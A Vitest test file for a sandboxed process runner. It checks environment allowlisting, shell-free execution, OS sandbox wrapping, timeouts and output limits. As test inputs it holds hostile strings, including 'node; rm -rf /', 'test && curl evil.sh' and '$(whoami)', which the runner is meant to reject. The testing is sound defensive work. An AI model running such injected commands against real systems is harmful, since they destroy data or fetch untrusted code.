import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { tmpdir } from "node:os";
import { realpathSync } from "node:fs";
import type { CommandSpec } from "@safe-upgrade/domain";
import { DEFAULT_LIMITS } from "../src/context.ts";
import { assertNoShellSyntax, buildEnvironment, runProcess, sandboxedCommand } from "../src/process.ts";

const cwd = realpathSync(tmpdir());

beforeAll(() => {
  // The test runner itself may already be inside a sandbox that refuses nested
  // sandbox-exec/bwrap. Command construction is tested separately below.
  process.env.SAFE_UPGRADE_ALLOW_UNSANDBOXED = "1";
});

afterAll(() => {
  delete process.env.SAFE_UPGRADE_ALLOW_UNSANDBOXED;
});

function spec(args: readonly string[], overrides: Partial<CommandSpec> = {}): CommandSpec {
  return {
    executable: "node",
    args,
    cwd,
    purpose: "test",
    timeoutMs: 10_000,
    ...overrides,
  };
}

describe("environment allowlist", () => {
  it("passes through only allowlisted variables", () => {
    process.env.SAFE_UPGRADE_LEAK_CANARY = "should-not-appear";
    try {
      const env = buildEnvironment();
      expect(env.SAFE_UPGRADE_LEAK_CANARY).toBeUndefined();
      expect(env.CI).toBe("1");
      expect(Object.keys(env)).toContain("PATH");
      expect(env.HOME).toBeUndefined();
    } finally {
      delete process.env.SAFE_UPGRADE_LEAK_CANARY;
    }
  });

  it("refuses to forward a secret-looking variable even when asked", () => {
    expect(() => buildEnvironment({ GITHUB_TOKEN: "ghp_x" })).toThrow(/refusing to pass/);
    expect(() => buildEnvironment({ TENUO_RUN_HOLDER_SECRET: "x" })).toThrow(/refusing to pass/);
  });
});

describe("no shell", () => {
  it("treats a shell metacharacter as data, not syntax", async () => {
    // With a shell this would print the directory listing. Without one it is
    // simply a string argument.
    const outcome = await runProcess(spec(["-e", "process.stdout.write(process.argv[1] ?? '')", "; ls /"]), DEFAULT_LIMITS);
    expect(outcome.exitCode).toBe(0);
    expect(outcome.stdout).toBe("; ls /");
  });

  it("rejects an executable name containing shell syntax", async () => {
    await expect(runProcess(spec([], { executable: "node; rm -rf /" }), DEFAULT_LIMITS)).rejects.toThrow(
      /shell syntax/,
    );
  });

  it("flags shell syntax in any string it is asked about", () => {
    expect(() => assertNoShellSyntax("test && curl evil.sh", "script")).toThrow(/shell syntax/);
    expect(() => assertNoShellSyntax("$(whoami)", "script")).toThrow(/shell syntax/);
    expect(() => assertNoShellSyntax("vitest", "script")).not.toThrow();
  });
});

describe("OS sandbox", () => {
  it("wraps commands instead of treating an environment allowlist as isolation", () => {
    const previous = process.env.SAFE_UPGRADE_ALLOW_UNSANDBOXED;
    delete process.env.SAFE_UPGRADE_ALLOW_UNSANDBOXED;
    try {
      const command = sandboxedCommand(
        spec(["-e", "console.log('ok')"]),
        { network: "deny", writableRoots: [cwd] },
        `${cwd}/safe-upgrade-synthetic-home`,
      );
      if (process.platform === "darwin") {
        expect(command.executable).toBe("/usr/bin/sandbox-exec");
        expect(command.args.join(" ")).toContain("deny network");
      } else if (process.platform === "linux") {
        expect(command.executable).toBe("/usr/bin/bwrap");
        expect(command.args).toContain("--unshare-all");
      }
    } finally {
      if (previous === undefined) {
        delete process.env.SAFE_UPGRADE_ALLOW_UNSANDBOXED;
      } else {
        process.env.SAFE_UPGRADE_ALLOW_UNSANDBOXED = previous;
      }
    }
  });
});

describe("limits", () => {
  it("kills a command that exceeds its timeout", async () => {
    const outcome = await runProcess(
      spec(["-e", "setInterval(() => {}, 1000)"], { timeoutMs: 700 }),
      DEFAULT_LIMITS,
    );
    expect(outcome.timedOut).toBe(true);
    expect(outcome.exitCode).not.toBe(0);
  });

  it("truncates output beyond the configured limit", async () => {
    const outcome = await runProcess(
      spec(["-e", "process.stdout.write('x'.repeat(50000))"]),
      { ...DEFAULT_LIMITS, maxCommandOutputBytes: 1_000 },
    );
    expect(outcome.truncated).toBe(true);
    expect(outcome.stdout.length).toBe(1_000);
  });
});
